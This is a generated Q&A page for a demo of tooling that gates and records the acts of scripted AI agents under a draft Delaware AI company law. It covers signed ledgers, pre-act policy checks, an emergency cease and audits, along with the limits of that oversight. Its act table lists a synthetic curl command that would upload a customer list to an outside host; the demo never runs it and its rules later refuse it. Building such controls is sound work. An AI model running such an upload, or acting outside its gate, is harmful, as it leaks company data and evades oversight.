<!-- GENERATED: edit answers.md.in, then `python3 capture.py render`. The tests fail if this file is stale. -->
# Delaware AIC draft: questions and answers, from a real run

This page answers the questions a reader of Delaware's draft Artificial Intelligence Company Act is likely to bring. Every answer points to evidence from one real run of this demo. Nothing needs installing or running to read it.

- **The run:** three hubs (the sandbox, the AIC, the manager's desk) and two gates, one per AI agent, all on one machine. Captured 2026-11-27, `hub 0.1.0-alpha.0 (25db4e5d clean, built 2026-11-27T03:41:11Z)`, `hestia 0.3.0 (v0.3.0-342-gfaffd549)`.
- **The evidence:** published unedited in [`evidence/`](evidence/). It holds the hubs' signed ledgers, the gates' signed records, the law each level ran, and the run's own audit.
- **What it isn't:** everything is fictional and synthetic: the company, the people, the counterparties, and the effects of allowed acts (a file is written in a scratch folder; shell commands never run). It is not legal advice, and it claims nothing about satisfying the draft. Assurance is A1: the agents cooperate, and the records are tamper-evident, not tamper-proof.

**Where to start:**

| If you are | Start with |
|---|---|
| drafting or reviewing the bill | [1](#1-what-does-the-managers-signed-record-look-like-and-who-signed-it), [5](#5-can-the-operating-agreement-loosen-the-states-rules), [7](#7-what-does-an-emergency-cease-look-like-and-how-fast), [12](#12-what-this-leaves-open-for-the-drafter) |
| the Sandbox Administrator or the AI Commission | [8](#8-what-would-the-administrator-get-on-an-audit-request), [2](#2-can-someone-other-than-the-ai-or-the-company-check-it), [7](#7-what-does-an-emergency-cease-look-like-and-how-fast), [11](#11-what-is-real-and-what-is-a-stand-in) |
| building compliance tooling for AI agents | [4](#4-is-the-law-checked-before-the-act-or-after), [3](#3-how-is-this-different-from-the-ais-own-log), [6](#6-what-if-the-ai-tries-to-put-a-forbidden-act-on-the-record-anyway), [10](#10-whose-software-is-this-and-does-it-lock-anyone-in) |
| asking about transparency or capture | [3](#3-how-is-this-different-from-the-ais-own-log), [10](#10-whose-software-is-this-and-does-it-lock-anyone-in), [11](#11-what-is-real-and-what-is-a-stand-in) |

## 1. What does the manager's "signed record" look like, and who signed it?

§81-301(c): "The manager must document any action the manager takes in a signed record."

**It is one entry on the AIC's ledger. It carries two signatures: the manager's own, over what it says it did, and the hub's, over the whole entry.** This is the record the manager made when it disclosed to a counterparty (§8008), ledger entry #16, unedited:

```json
{
  "index": 16,
  "timestamp": "2026-11-27T03:51:56.887200389Z",
  "prev_hash": "a05398820d3b7806ce9968e732a653fbbee6e22fa737af240742d459ffa43656",
  "actor_lct_id": "103afc99-86fa-4552-bacd-31dae983ac99",
  "event": {
    "kind": "post_added",
    "topic_id": "b9eb643b-0759-494a-9087-3ab52452ef0a",
    "post_id": "dcaa621a-3373-48db-a6e0-03939a3c3bc4",
    "body": "act: counterparty_disclosed example-castings\nevidence: sha256-content:5f29c846e2a891088ab0225bd178d1f83326e481bfa12dd1f999e1ce9e39ee3a\nsigned-by: 73a1d1de-0d43-4752-aae9-ffe49833f7b8\nsig: fef736fc62b2c99c07a6f7870eaa1a0fed32614f509f3e7d36dfbbfcb722cf173f35c19401a0a96b966980bff03bc41327f2647a85039df21d5a507081ecb009",
    "posted_by": "73a1d1de-0d43-4752-aae9-ffe49833f7b8"
  },
  "signature": "04c832c2de7b4e8242eaa744f352d9ed65c2f28140ea400ac62ce36cb8bec4e4e3185df1d2a072791d6f49801d3720f81c843f262e5a4b755aa12e08b6cb3e0c",
  "entry_hash": "31f1b8ea9d4df75072b5ef68e4dce64879e2624951590c69ef5294e66d877227"
}
```

- **`body`** is the manager's record:
  - `act:` what it did;
  - `evidence:` the SHA-256 of the disclosure document it wrote;
  - `signed-by:` its identity on this hub;
  - `sig:` its Ed25519 signature over the first two lines.
- **The manager's key** was pinned when the AIC admitted it, in ledger entry #1 (`member_pubkey_hex` `76eb1f9e673ba95354d66f87f0f701971b497ad66e09e15d59242628bd1128fd`). That admission entry is signed by the hub too.
- **`signature`** is the hub's, made with key `c52af7c4e7a36aef2ab60da240dc18af38b310dc525d48560c14aaee28b13168` over the entry as a whole. The manager doesn't hold that key.
- **`prev_hash`** ties the entry to the one before it. Changing any byte of any earlier entry breaks every link after it.

**Limit:** Hub checks the manager's signature on the request when it arrives, then keeps only its own. So the demo also carries the manager's signature inside the record body. Keeping the actor's own signature on the entry is on Hub's build list.

## 2. Can someone other than the AI, or the company, check it?

**Yes, with nothing but the published files and public algorithms (SHA-256, Ed25519).** In this run:
- all 9 of the manager's signed records and all 4 of its sub-agent's verify, each against the key from the ledger's own admission entry;
- every entry of all three ledgers recomputes to its stored hash, links to the one before it, and carries a valid hub signature (de-sandbox 9 entries, aic 24 entries, desk 17 entries).

**Limit:** the hub's key comes from the hub's own published descriptor, so a check run from this folder alone shows the records are internally consistent and signed by that key. To show the key belongs to the sandbox, the AIC or the desk, an auditor gets the key from somewhere the company doesn't control. Head anchoring (question 9) is the start of that, and it is a stand-in today.

<details><summary>Check it yourself (optional)</summary>

```
python3 check_evidence.py          # python3 + cryptography; no hub, no gate, no network; exit 1 on any failure
```
</details>

## 3. How is this different from the AI's own log?

The draft's evidence is the manager's own signed record, which is the AI vouching for itself. **This run keeps three records. Only the first is written by the AI:**

1. **The manager's signed records** (question 1). They are the AI's account of what it did.
2. **The hub's ledger.** The hub signs it. The manager can add to it only through the hub's law (question 6), and can't edit, reorder or drop an entry without breaking the hashes.
3. **Each gate's record of every act the agent attempted, refused ones included.** The gate writes it, including its own decision on each act, and signs it with the gate's witness key (the manager's gate: `fae02c66670f71e87f0a7272dfcc198969720c29f8fd8f785b3f0662fb5c8eb6`). The agent can ask the gate and report how an act turned out, but it can't edit or remove anything the gate has recorded.

The manager's gate recorded 17 acts, 6 of them refused or incomplete; the sub-agent's gate 10, 6 refused or incomplete. 9 of those acts were refused outright, so they exist only in the gates' records: nothing happened, and the agent itself wrote nothing about them. One of the manager's refusals, from its gate's record:

```json
{
  "timestamp": "2026-11-27T03:51:41.853524160+00:00",
  "event_type": "policy_decision",
  "event_data (selected fields)": {
    "plugin_id": "aic-manager",
    "tool_name": "Write",
    "target": "/tmp/aic-delaware-run/workspace/counterparties/example-metals/outbox/hello.md",
    "decision": "deny",
    "enforced": true,
    "rule_id": "DE-DISCLOSE-FIRST",
    "rule_name": "No message to a counterparty before its §8008 disclosure is on the record (the bridge opens the outbox once it is).",
    "reason": "r-04: No message to a counterparty before its §8008 disclosure is on the record (the bridge opens the outbox once it is)."
  },
  "prev_hash": "d486d660c3894f2b7eecf0b378561b2879c5a5909c8de7c9a7c50fc3a12cc40c",
  "hash": "8e5ac17e100fbabbe2d8143097dcf25c012c9b42bc0be944ada3b06995f78f23"
}
```

The run's audit (question 8) checks these three against one another: what the story says happened, what the hubs recorded, and what the gates decided.

**Limits:**
- **A1.** A gate sees the acts that go through it. An agent with another way to act, outside its gate, isn't seen. Each gate's own record says so; this run's manager gate recorded "gate set could not be established: shared engine deployment record is not configured" (status: unknown).
- **Tamper-evident, not tamper-proof.** Whoever holds a hub's key could rewrite and re-sign its whole ledger. What closes that is a copy of the ledger's head held by someone else (question 9).

## 4. Is the law checked before the act, or after?

**Before. Every act goes to the agent's gate, the gate decides under the law in force at that moment, and only an allowed act happens.** Here is every act in the run. The same act gets a different answer as each level's law arrives:
- **beat 1:** no law;
- **beat 2:** the state's law;
- **beat 3:** the operating agreement;
- **beat 4:** the manager's delegation to its sub-agent;
- **beat 7:** after the suspension.

| beat | agent | act | target | gate | rule | outcome |
|---|---|---|---|---|---|---|
| 1 | manager | Write | `counterparties/example-metals/outbox/hello.md` | allowed | (no rule covers it) | file written; record landed |
| 1 | manager | Write | `contracts/executed/2026-001.md` | allowed | (no rule covers it) | file written; record landed |
| 1 | manager | Edit | `treasury/ledger.csv` | allowed | (no rule covers it) | file written; record landed |
| 1 | manager | Bash | `curl -F f=@records/customer-list.md https://api.examp...` | allowed | (no rule covers it) | the command is never executed |
| 1 | procure | Write | `procurement/special-orders/po-17.md` | allowed | (no rule covers it) | file written; record landed |
| 1 | procure | Read | `counterparties/example-castings/disclosure.md` | allowed | (no rule covers it) | failed: no such file: the act failed |
| 2 | manager | Write | `counterparties/example-metals/outbox/hello.md` | **refused** | DE-DISCLOSE-FIRST | nothing happened |
| 2 | manager | Write | `contracts/executed/2026-001.md` | allowed | (no rule covers it) | file written; record landed |
| 2 | manager | Edit | `treasury/ledger.csv` | allowed | (no rule covers it) | file written; record landed |
| 2 | manager | Bash | `curl -F f=@records/customer-list.md https://api.examp...` | allowed | (no rule covers it) | the command is never executed |
| 2 | procure | Write | `procurement/special-orders/po-17.md` | allowed | (no rule covers it) | file written; record landed |
| 2 | procure | Read | `counterparties/example-castings/disclosure.md` | allowed | (no rule covers it) | failed: no such file: the act failed |
| 3 | manager | Write | `counterparties/example-metals/outbox/hello.md` | **refused** | DE-DISCLOSE-FIRST | nothing happened |
| 3 | manager | Write | `contracts/executed/2026-001.md` | **refused** | OA-NO-EXECUTE | nothing happened |
| 3 | manager | Edit | `treasury/ledger.csv` | **refused** | OA-NO-TREASURY | nothing happened |
| 3 | manager | Bash | `curl -F f=@records/customer-list.md https://api.examp...` | **refused** | OA-NO-EGRESS-SHELL | nothing happened |
| 3 | procure | Write | `procurement/special-orders/po-17.md` | allowed | (no rule covers it) | file written; record landed |
| 3 | procure | Read | `counterparties/example-castings/disclosure.md` | allowed | OA-LISTED-CASTINGS | failed: no such file: the act failed |
| 3 | manager | Write | `counterparties/example-castings/disclosure.md` | allowed | OA-LISTED-CASTINGS | file written; record landed |
| 3 | manager | Write | `counterparties/example-castings/outbox/rfq-2026-001.md` | allowed | BRIDGE-OPEN-EXAMPLE-CASTINGS | file written; record landed |
| 3 | manager | Write | `contracts/drafts/2026-001.md` | allowed | (no rule covers it) | file written; record landed |
| 4 | procure | Write | `procurement/special-orders/po-17.md` | **refused** | DESK-CATALOG-ONLY | nothing happened |
| 4 | procure | Write | `procurement/catalog-orders/po-16.md` | allowed | (no rule covers it) | file written; record landed |
| 4 | procure | Read | `counterparties/example-castings/disclosure.md` | **refused** | DESK-NO-COUNTERPARTIES | nothing happened |
| 7 | manager | Write | `counterparties/example-castings/outbox/rfq-2026-002.md` | **refused** | BRIDGE-SUSPENDED | nothing happened |
| 7 | procure | Write | `procurement/catalog-orders/po-18.md` | **refused** | BRIDGE-SUSPENDED | nothing happened |
| 7 | manager | Write | `wind-down/notice-example-castings.md` | allowed | BRIDGE-WIND-DOWN | file written; record landed |

A consequential act counts as done only once its signed record has landed at the hub. In this run that's every act whose outcome says "record landed".

The law each hub ran, by beat: beat 2: de-sandbox 2 norms, aic 2 norms, desk 2 norms; beat 3: aic 4 norms, desk 4 norms; beat 4: desk 5 norms. Each level holds its own norms plus every level above it. The law files are in [`evidence/law/`](evidence/law/).

## 5. Can the operating agreement loosen the state's rules?

§81-205(d) lists what an operating agreement may not do.

**No. The compiler refuses a looser rule before it can take effect.** The example operating agreement includes clause 2.3, which would let repeat customers skip the §8008 disclosure. In this run it was refused as:

> `NormRefusedRuleConflicted`: OA-REPEAT-NO-DISCLOSURE (r-23) — resolve the conflict, then it compiles

The state's citation contradicts the clause, so it never compiles. What if the member overrules that citation? The capture did exactly that on a copy of the rulebook and compiled again. The clause was refused a second time, now because it would loosen the parent's law:

- `ChildOverrideWidensParent`: aic: OA-REPEAT-NO-DISCLOSURE would loosen de-sandbox's DE-DISCLOSE-FIRST; DE-DISCLOSE-FIRST stays in force

The compiler then stops: exit code 1, activation allowed: false. No law is loaded from a run like that.

**Why it needs a compiler, found while building this:** both engines evaluate one flattened rule set. Hub takes the highest-priority norm, and Hestia the first match. So a permissive company-level rule could outrank a stricter state rule on the same act without anyone noticing. The compiler treats any child rule that could do that as a blocking error, not a question of precedence. `tests/live_engine_probe.py` shows both engines behaving that way.

## 6. What if the AI tries to put a forbidden act on the record anyway?

**The hub's law decides what can be recorded, so a record isn't a way around the gate.** In this run:

- Beat 3, `contract_executed` from manager to aic: **202**, "act requires escalation to sovereign (AIC-ESC-CONTRACT); admin review queue is V2-16"
- Beat 4, `special_order_placed` from procure to desk: **202**, "act requires escalation to sovereign (DESK-ESC-SPECIAL-ORDER); admin review queue is V2-16"
- Beat 7, `counterparty_message` from manager to aic: **403**, "act denied by hub law (norm: SUSPENDED-ALL-ELSE)"

A held record (202) waits for the person the law names: the member, for the AIC; the manager, for its desk. A refused one (403) is not recorded at all. Neither counts as a landed record, so the act isn't complete.

## 7. What does an emergency cease look like, and how fast?

§8005(c)(6)c.1 asks each applicant for "a description of the emergency measures available … to promptly cease any unauthorized activity by the AI agent".

**The administrator removes the AIC from the sandbox. Both agents' gates were refusing every act 576 ms later, and every act tried after that was refused except wind-down, which the law lets continue.** After that, most of the time goes to narrowing the AIC hub's own law, which took 5281 ms here: Hub has no live law update, so the demo stops the hub, loads the new law and restarts it. The run's own timeline:

| when | what | result |
|---|---|---|
| +0 ms | administrator removes the AIC from the sandbox | 200 `{"entry_index": 8, "removed": true}` |
| +2 ms | BRIDGE: the sandbox's member list no longer holds the AIC | done |
| +576 ms | BRIDGE: both gates: every act stops (rule BRIDGE-SUSPENDED in force) | done |
| +5857 ms | BRIDGE: the AIC hub's law narrowed to wind-down records (3 norms; Hub has no live law update, so the hub restarts) | done |
| +6386 ms | BRIDGE: both gates: wind-down/ may continue (rule BRIDGE-WIND-DOWN) | done |
| +6391 ms | manager Write `counterparties/example-castings/outbox/rfq-2026-002.md` | **refused** by BRIDGE-SUSPENDED |
| +6399 ms | procure Write `procurement/catalog-orders/po-18.md` | **refused** by BRIDGE-SUSPENDED |
| +6404 ms | manager Write `wind-down/notice-example-castings.md` | allowed by BRIDGE-WIND-DOWN |
| +6410 ms | manager records `wind_down_notice` at aic | landed #23 |
| +6417 ms | manager records `counterparty_message` at aic | **403**: act denied by hub law (norm: SUSPENDED-ALL-ELSE) |

**Limits, both found by building this:**
- **The cascade is a stand-in.** The step from the removal to the gates and to the AIC's law is a script, marked BRIDGE on screen. It acts only on evidence it has checked: the removal returned 200, and the sandbox's member list no longer holds the AIC. Hub doesn't push a suspension down yet.
- **Removal is the wrong act for a suspension.** Once the AIC is removed, its wind-down records can't be anchored in the sandbox any more. This run ends with 4 AIC entries the sandbox never anchored. The draft's wind-down needs a suspended member state: it may report wind-down and answer audits, and nothing else. That state is on Hub's build list.

A1 applies here too: the gates stop what goes through them.

## 8. What would the administrator get on an audit request?

§8005(c)(10)b requires an applicant to make all records relevant to its participation "available for audit by the Sandbox Administrator on request".

**A folder like [`evidence/`](evidence/), and an audit that recomputes everything in it.** This run's audit passed:

- `ledgers_verified`: {"got": 3, "want": 3}
- `heads_consistent`: {"got": 2, "want": 2, "posted": 2}
- `acknowledged_entries_in_ledger`: {"got": 15, "want": 15}
- `signatures_aic`: {"got": 9, "want": 9, "invalid": 0}
- `signatures_desk`: {"got": 4, "want": 4, "invalid": 0}
- `gate_manager`: {"got": 17, "want": 17, "successful": 11, "want_successful": 11, "broken_links": 0}
- `gate_procure`: {"got": 10, "want": 10, "successful": 4, "want_successful": 4, "broken_links": 0}

Meaning:
- **`ledgers_verified`:** each hub's chain checked.
- **`heads_consistent`:** each head a parent holds matches the child's ledger.
- **`acknowledged_entries_in_ledger`:** every record a hub acknowledged is in place.
- **`signatures_*`:** the agents' own signatures.
- **`gate_*`:** each gate's acts match what the story did.

The gates' records were also checked with Hestia's own verifier, against the chain id, the witness key and the final hash: manager: valid (76 entries, 76 signatures valid, links intact: true), procure: valid (65 entries, 65 signatures valid, links intact: true).

**Limit:** all of this ran on one machine under one operator. The cross-checks show the records are consistent with one another. They are not independent witnesses, because nobody outside held a copy. The gates' verifier states its own limits:

- complete capture and non-bypass of the gate are not established
- truthful event semantics and key custody are not established (A1)
- the society LCT is context; it does not prove this witness was authorised

<details><summary>Check the gate records yourself (optional; needs <code>hestia</code>)</summary>

```
hestia chain-verify evidence/gates/manager.segment.json --expect-chain-id hestia-chain:0f871836da23643df3eca86a33f586ffba9b42c9e32d5beba51826633ab008ea --expect-end-hash 0018d280e34a1049cd8912872a8be8f45519debbf386e915cad6482bafe7932d --trusted-witness-key fae02c66670f71e87f0a7272dfcc198969720c29f8fd8f785b3f0662fb5c8eb6
```
</details>

## 9. Does the sandbox see the company's data?

**No. Each level gives its parent only its ledger head: one hash and an entry count.** That hash pins the child's whole record up to that point without revealing any of it. The sandbox's copy of the AIC's head:

```
act: ledger_head aic entries=20 head=75ec6304d51dba1bf280b8c754799f242b6ea849fc61a55a185b0fb652162406
```

- de-sandbox entry #7 holds `75ec6304d51dba1bf280b8c754799f242b6ea849fc61a55a185b0fb652162406`, aic's entry #19: matches. 4 later aic entries not anchored.
- aic entry #19 holds `2bfb647c96bc3b867243c5614b26f4040487a219c2d7fc686cd5190ec5039a16`, desk's entry #16: matches. 0 later desk entries not anchored.

**Limit:** posting heads upward is a stand-in (BRIDGE). Hub's signed head exchange between levels isn't built yet. And because all three hubs ran on one machine, the parent's copy isn't yet held by anyone independent of the company.

## 10. Whose software is this, and does it lock anyone in?

- **The code is open source**, AGPL-3.0: the hubs, the gates, the rulebook compiler and this demo.
- **It runs on the participant's own machine,** with no hosted service and no network calls beyond the machine itself.
- **The records use public formats and algorithms.** [`check_evidence.py`](check_evidence.py) is about 200 lines of Python, and anyone can write their own.
- **Any agent or model can sit behind a gate.** In this run the agents are scripted, with no model at all. The same gates govern commercial coding agents on the authors' own machines.
- **Patents:** Metalinxx Inc. holds patents and applications on parts of this technology. AGPL-3.0 §11 grants every user a royalty-free patent license for any use the license permits, commercial or not. See [`PATENTS.md`](../../PATENTS.md).

## 11. What is real, and what is a stand-in?

| | |
|---|---|
| **Real** | Three hubs, each with its own law and its own signed, hash-chained ledger. Law compiled from a cited rulebook, tightened and never loosened down the levels. The manager's records, checked against hub law on arrival (refused, held or recorded). Two gates refusing acts by rule, each keeping its own signed record. The administrator's removal of the AIC. |
| **Stand-in (`BRIDGE`)** | Ledger heads posted into the parent. The disclosure opening a counterparty's outbox at the gate. The suspension reaching the gates and the AIC's law. The manager's signature carried in the record body. Each child society joining its parent as an ordinary member. Every bridge step acts only on evidence it has checked, and says so when it does nothing. |
| **Synthetic** | The effects of allowed acts: files in a scratch folder; shell commands never run. |

## 12. What this leaves open for the drafter

Building against the draft raised five questions that only the drafter or the Commission can answer:

1. **Does a ledger entry signed with the manager's key count as a "signed record"?** §81-102(26) defines "sign" as acting "with present intent to authenticate or adopt a record", including to "attach to or logically associate with the record an electronic symbol, sound, or process". The manager's Ed25519 signature is that kind of electronic process. The open part is intent: can software have present intent, or does a member's adoption have to be part of the record?
2. **Is a record only the agent signed enough for the administrator,** or should it be witnessed by something the agent doesn't control (question 3)?
3. **What counts as "promptly cease":** seconds or hours? Must it reach every way the agent can act, or only the ones the participant has gated?
4. **Suspension, or removal?** If wind-down must stay reportable, the draft may need a suspended status distinct from removal (question 7).
5. **Who holds the copy?** A record is only independently verifiable if someone other than the participant holds its head. Is that the administrator, a third party, or nobody?

The rulebook behind this demo cites each rule to its section of the draft: [`rulebook/rulespeak/aic-rulebook.md`](rulebook/rulespeak/aic-rulebook.md). Its open questions for a drafter are in [`rulebook/interview.md`](rulebook/interview.md).

---

<sub>Regenerate: `python3 capture.py run` (a fresh run and export; needs the hub binaries and hestia), then `python3 capture.py render`. The page and the evidence come from the same run. `tests/test_evidence.py` checks that this page matches the evidence and that the evidence verifies.</sub>
